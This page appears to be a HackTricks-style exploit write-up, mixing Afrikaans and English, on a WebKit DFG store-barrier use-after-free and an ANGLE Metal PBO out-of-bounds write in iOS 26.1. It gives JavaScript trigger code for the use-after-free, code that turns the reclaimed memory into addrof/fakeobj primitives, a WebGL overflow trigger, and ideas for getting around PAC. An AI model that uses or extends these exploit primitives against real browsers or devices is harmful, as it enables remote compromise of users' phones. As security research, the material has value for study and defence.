# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## Opsomming
- **DFG Store Barrier bug (CVE-2025-43529)**: In `DFGStoreBarrierInsertionPhase.cpp`, a **Phi node marked escaped while its Upsilon inputs are not** veroorsaak dat die fase **skip inserting a write barrier** op daaropvolgende object stores. Onder GC-druk laat dit JSC toe om steeds-bereikbare objects vry te gee → **use-after-free**.
- **Eksploitdoelwit**: Forceer ’n **Date** object om ’n butterfly te materialiseer (bv. `a[0] = 1.1`) sodat die butterfly vrygestel word, en dan **reclaimed** as array element storage om boxed/unboxed verwarring te bou → `addrof`/`fakeobj` primitives.
- **ANGLE Metal PBO bug (CVE-2025-14174)**: Die Metal backend ken die PBO staging buffer toe met behulp van `UNPACK_IMAGE_HEIGHT` in plaas van die werklike texture height. Deur ’n baie klein unpack height te verskaf en dan ’n groot `texImage2D` uit te voer veroorsaak dit ’n **staging-buffer OOB write** (~240KB in the PoC below).
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector` en JSArray `butterfly` is PAC-signed; forging fake objects met aanvaller-gekose pointers laat crash met `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Slegs die hergebruik van **already-signed** butterflies (boxed/unboxed reinterpretation) werk.

## Uitlok van die DFG missing barrier → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Belangrike punte:
- Plaas **A** in old space om generational barriers te oefen.
- Skep 'n geïndekseerde **Date** sodat die **butterfly** die vrygestelde teiken is.
- Spray `ArrayBuffer(0x800000)` om GC te dwing en die race te verbreed.
- Die Phi/Upsilon escape mismatch verhoed barrier insertion; `b.p1 = a` loop **without a write barrier**, so GC herwin `a`/butterfly.

## Butterfly reclaim → boxed/unboxed verwarring
Nadat GC die Date butterfly vrygestel het, spray arrays sodat die vrygestelde slab hergebruik word as elements vir twee arrays met verskillende element kinds:
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
Status op **iOS 26.1 (arm64e)**:
- **Werkend:** `addrof`, `fakeobj`, 20+ address leaks per run, inline-slot read/write (on known inline fields).
- **Nog nie stabiel nie:** generalized `read64`/`write64` via inline-slot backings.

## PAC-beperkings op arm64e (waarom fake objects crash)
- **TypedArray `m_vector`** en **JSArray `butterfly`** is PAC-onderteken; die vervalsing van pointers lei tot `EXC_BAD_ACCESS` / waarskynlik `EXC_ARM_PAC`.
- Die confusion-primitive werk omdat dit **legitieme signed butterflies hergebruik**; die invoer van unsigned attacker pointers faal authentisering.
- Potensiële omseilingsidees: JIT paths wat auth oorslaan, gadgets wat attacker pointers sign, of pivoting deur die ANGLE OOB.

## ANGLE Metal PBO onder-toewysing → OOB write
Gebruik 'n klein unpack height om die staging buffer te verklein, en laai dan 'n groot texture op sodat die copy oorloop:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
Aantekeninge:
- Fout in `TextureMtl.cpp`: staging buffer gebruik `UNPACK_IMAGE_HEIGHT` in plaas van die werklike tekstuurhoogte op die PBO-pad.
- In die verwysde probe is die WebGL2 PBO-trigger gekoppel maar nog nie betroubaar waargeneem op iOS 26.1 nie.

## Verwysings
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
